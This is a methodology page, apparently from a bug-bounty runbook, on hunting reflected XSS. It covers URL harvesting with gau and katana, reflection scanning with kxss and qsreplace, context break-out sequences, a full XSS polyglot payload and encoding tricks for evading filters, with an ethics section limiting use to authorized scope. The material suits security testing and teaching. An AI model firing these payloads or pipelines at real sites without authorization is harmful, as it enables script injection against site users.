---
title: "Reflecting Techniques & Polyglot Payloads"
description: "Locating reflection points, identifying the surrounding context, and using polyglot payloads with encoding tricks that survive multiple contexts and filters."
phase: Web
order: 10
tags:
  - reflection
  - polyglot
  - xss
  - evasion
tools:
  - kxss
  - qsreplace
  - gau
updated: 2026-10-01
---

A runbook for authorized reflection hunting on **in-scope** targets. Goal: enumerate every place input is echoed, identify the surrounding context, and land a payload that survives the app's encoding.

## 1. Harvest reflective URLs

Collect every URL carrying input from archives and crawlers.

```bash
gau target.com | grep '=' | sort -u > urls.txt
katana -u https://target.com -d 3 -silent | grep '=' | sort -u | tee -a urls.txt
```

## 2. Send a unique marker everywhere

Place a hard-to-guess marker in every parameter and search the whole response.

```bash
# Scan each URL's params, flagging unencoded special characters
cat urls.txt | kxss | tee kxss.txt

# Manually confirm one: send the marker and grep the response
curl -s "https://target/search?q=zq7reflection9x" | grep -o 'zq7reflection9x'
```

Also check headers, cookies, path segments, error pages, `Location` headers, and JSON APIs.

## 3. Identify the context

The context decides your break-out sequence.

| Context | Example | Break-out |
|---------|---------|-----------|
| HTML body | `<div>INPUT</div>` | `<script>...</script>` or `<img onerror=...>` |
| Attribute | `<input value="INPUT">` | `" onmouseover="..."` |
| JS string | `var x = 'INPUT';` | `';...//` |
| URL/href | `<a href="INPUT">` | `javascript:...` |
| CSS/JSON | `{"k":"INPUT"}` | `\";...` |

Watch how the app encodes: `<` to `&lt;`, dropped quotes, added backslashes, or case flipping.

## 4. Test with a polyglot

When you cannot see the rendered context, one payload can cover several at once.

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

If it fires, narrow down the true context with a minimal targeted payload.

## 5. Encode around filters

Filters usually match literal strings, so change the representation.

```bash
# Try a marker plus encoded variants and diff responses
cat urls.txt | qsreplace '%3Cscript%3Ealert(1)%3C%2Fscript%3E' \
  | xargs -I{} curl -s {} -o /dev/null -w "%{http_code} {}\n"
```

- HTML entities: `&#x61;lert(1)`, `&lt;script&gt;`.
- URL and double encoding: `%3C`, `%253C`.
- Unicode and case: `JaVaScRiPt`, `\u003c`.
- Whitespace: tab, newline, form feed, comments inside tags.

## 6. Minimize and confirm

Replace the polyglot with the smallest working proof — `alert(document.domain)` or a callback to a host you control. Report the raw request, the context, and the escaped response.

## Full pipeline

```bash
# 1. Harvest
gau target.com | grep '=' | sort -u > urls.txt
katana -u https://target.com -d 3 -silent | grep '=' | sort -u | tee -a urls.txt

# 2. Find reflections (unencoded chars beside your marker)
cat urls.txt | kxss | tee kxss.txt

# 3. Probe encoded variants and watch for differences
cat urls.txt | qsreplace '%3Cscript%3Ealert(1)%3C%2Fscript%3E' \
  | xargs -I{} curl -s {} -o /dev/null -w "%{http_code} {}\n"

# 4. Fire a polyglot at the promising contexts, then reduce to a minimal PoC
```

## Ethics & legality

- Only test targets in an official scope or with written authorization.
- Never use session-stealing payloads against real users; use a harmless alert or your own callback.
- Keep the proof minimal and store the raw request/response as evidence.
